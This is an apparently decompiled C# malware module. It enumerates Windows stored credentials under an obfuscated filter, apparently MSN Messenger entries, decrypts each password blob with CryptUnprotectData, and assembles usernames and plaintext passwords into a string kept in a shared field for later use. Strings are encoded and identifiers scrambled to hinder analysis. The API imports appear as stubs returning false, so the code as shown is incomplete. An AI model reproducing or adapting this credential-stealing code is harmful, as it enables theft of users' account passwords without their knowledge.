using System;
using System.Runtime.InteropServices;
using System.Runtime.InteropServices.ComTypes;
using System.Text;
using Microsoft.VisualBasic.CompilerServices;

public class DAMSN
{
	public class MSNdll
	{
		[Flags]
		public enum CryptProtectPromptFlagz
		{
			CRYPTPROTECT_PROMPT_ON_UNPROTECT = 1,
			CRYPTPROTECT_PROMPT_ON_PROTECT = 2
		}

		[StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
		public struct DATA_BLOGS
		{
			public int cbData;

			public IntPtr pbData;
		}

		[StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
		public struct CRYPTPROTECT_PROMPTSTRUCTZ
		{
			public int cbSize;

			public CryptProtectPromptFlagz dwPromptFlags;

			public IntPtr hwndApp;

			public string szPrompt;
		}

		public struct CREDENTIAL
		{
			public IntPtr dwFlags;

			public IntPtr dwType;

			public IntPtr lpstrTargetName;

			public IntPtr lpstrComment;

			public FILETIME ftLastWritten;

			public IntPtr dwCredentialBlobSize;

			public IntPtr lpbCredentialBlob;

			public IntPtr dwPersist;

			public IntPtr dwAttributeCount;

			public IntPtr lpAttributes;

			public IntPtr lpstrTargetAlias;

			public IntPtr lpUserName;
		}

		public string DDSHIT(byte[] Datas)
		{
			checked
			{
				string result = default(string);
				try
				{
					DATA_BLOGS dataIn = default(DATA_BLOGS);
					DATA_BLOGS pDataOut = default(DATA_BLOGS);
					GCHandle gCHandle = GCHandle.Alloc(Datas, GCHandleType.Pinned);
					dataIn.pbData = gCHandle.AddrOfPinnedObject();
					dataIn.cbData = Datas.Length;
					gCHandle.Free();
					CryptUnprotectData(ref dataIn, 0, 0, 0, 0, 0, ref pDataOut);
					byte[] array = new byte[pDataOut.cbData + 1];
					Marshal.Copy(pDataOut.pbData, array, 0, pDataOut.cbData);
					string @string = Encoding.Default.GetString(array);
					result = @string.Substring(0, @string.Length - 1);
					return result;
				}
				catch (Exception projectError)
				{
					ProjectData.SetProjectError(projectError);
					ProjectData.ClearProjectError();
					return result;
				}
			}
		}

		public static bool CryptUnprotectData(ref DATA_BLOGS dataIn, int ppszDataDescr, int optionalEntropy, int pvReserved, int pPromptStruct, int dwFlags, ref DATA_BLOGS pDataOut)
		{
			return false;
		}

		public static bool CredEnumerate(string filter, int flag, ref int oMhrmhotLlExlwDkbjCerlkhqoalxa, ref IntPtr puweopTywlscmvSnEiihkDydryxgIJ)
		{
			return false;
		}

		public static void GTMSN()
		{
			string mVUKM = GOSLWHR.WHJBIYT("KA==", "False");
			int oMhrmhotLlExlwDkbjCerlkhqoalxa = 0;
			IntPtr puweopTywlscmvSnEiihkDydryxgIJ = IntPtr.Zero;
			IntPtr[] array = null;
			bool flag = CredEnumerate(GOSLWHR.WHJBIYT("mMXV0s+4z7PX1qaW1c/NppmRCA==", "False"), 0, ref oMhrmhotLlExlwDkbjCerlkhqoalxa, ref puweopTywlscmvSnEiihkDydryxgIJ);
			checked
			{
				try
				{
					if (flag)
					{
						array = new IntPtr[oMhrmhotLlExlwDkbjCerlkhqoalxa - 1 + 1];
						IntPtr intPtr = puweopTywlscmvSnEiihkDydryxgIJ;
						int num = oMhrmhotLlExlwDkbjCerlkhqoalxa - 1;
						for (int i = 0; i <= num; i++)
						{
							ref IntPtr reference = ref array[i];
							reference = Marshal.ReadIntPtr((IntPtr)(intPtr.ToInt32() + IntPtr.Size * i));
							CREDENTIAL cREDENTIAL = (CREDENTIAL)Marshal.PtrToStructure(array[i], typeof(CREDENTIAL));
							DATA_BLOGS dataIn = default(DATA_BLOGS);
							DATA_BLOGS pDataOut = default(DATA_BLOGS);
							dataIn.pbData = cREDENTIAL.lpbCredentialBlob;
							dataIn.cbData = (int)cREDENTIAL.dwCredentialBlobSize;
							CryptUnprotectData(ref dataIn, 0, 0, 0, 0, 1, ref pDataOut);
							mVUKM = GOSLWHR.WHJBIYT("WnWAh3ladYCHeVp1gIeJcIaAh3ladYCHeVp1gId5WnUr", "False") + Environment.NewLine + Environment.NewLine + GOSLWHR.WHJBIYT("ebKvw7GFrK+LYyI=", "False") + Marshal.PtrToStringAuto(cREDENTIAL.lpUserName) + Environment.NewLine + GOSLWHR.WHJBIYT("gKzJ0MafvbqXbxY=", "False") + Marshal.PtrToStringAuto(dataIn.pbData) + Environment.NewLine + Environment.NewLine + GOSLWHR.WHJBIYT("cYyXnpBxjJeekHGMl56QcYyXnpBxjJeekHGMl56QcYwU", "False");
						}
						NTUIYURW.MVUKM = mVUKM;
					}
				}
				catch (Exception projectError)
				{
					ProjectData.SetProjectError(projectError);
					NTUIYURW.MVUKM = GOSLWHR.WHJBIYT("KA==", "False");
					ProjectData.ClearProjectError();
				}
			}
		}
	}
}
